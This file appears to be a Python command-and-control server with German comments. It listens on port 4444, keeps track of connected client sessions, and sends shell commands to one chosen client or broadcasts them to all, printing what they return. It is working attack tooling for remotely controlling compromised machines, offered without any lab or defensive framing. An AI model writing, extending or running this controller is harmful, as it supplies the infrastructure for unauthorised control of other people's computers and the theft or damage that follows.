import socket
import threading
import subprocess
import sys
import time


# Clients Connections und IDs speichern
clients = {}
client_id = 0
lock = threading.Lock()


def handle_client(client_socket, client_address, cid):
    """Einzelne Client Verbindung verarbeiten"""
    print(f"[+] Neue Verbindung: ID {cid} from {client_address}")
    clients[cid] = client_socket

    try:
        while True:
            # Clientantworten auf befehle erhalten
            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            print(f"[ID {cid}] Response: {data}")

    except Exception as e:
        print(f"[!] Fehler mit client ID {cid}: {e}")

    finally:
        with lock:
            del clients[cid]
        client_socket.close()
        print(f"[-] Client ID {cid} discconnected")


def broadcast_command(command):
    """Befehl an alle verbundenen Clients senden"""
    with lock:
        for cid, client_socket in clients.items():
            try:
                client_socket.send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"[!] Fehler beim senden an {cid}: {e}")


def send_command_to_client(cid, command):
    """Befehl an einen spezifischen Client senden"""
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"[!] Fehler beim senden an {cid}: {e}")

        else:
            print(f"[!] Client ID {cid} konnte nicht gefunden werden")


def list_sessions():
    """Alle aktiven Client Sessions ausgeben"""
    with lock:
        if not clients:
            print("[!] Keine aktiven Sessions")
        else:
            print("[*] Aktive Sessions:")
            for cid in clients:
                print(f"\t ID {cid}")


def server_shell():
    """Interaktive Shell für die Befehle"""
    global client_id
    while True:
        cmd = input("C2> ").strip()
        if cmd == "sessions":
            list_sessions()
        elif cmd.startswith("interact "):
            try:
                # Versuchen die Client ID aus dem Befehl auszulesen
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(
                        f"[*] Interacting with ID {cid}. Zum verlassen 'background' eingeben"
                    )
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] CLient ID {cid} nicht gefunden")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")
        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")
        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            sys.exit(0)
        else:
            print("[!] Commands: session, interact <id>, broadcast <cmd>, exit")


def main():
    """Main Server Function"""
    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    print("[*] C2 Server started on port 4444")
    print(f"[*] Server IP: {socket.gethostbyname(socket.gethostname())}")

    # Server Shell in eigenem Threat starten
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            conn, addr = server.accept()
            print("Client connected from", addr)
            print("Local IP used for this connection:", conn.getsockname()[0])
            with lock:
                client_id += 1
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(conn, addr, client_id),
                )
                client_thread.daemon = True
                client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Shutting down Server")
        server.close()


if __name__ == "__main__":
    main()
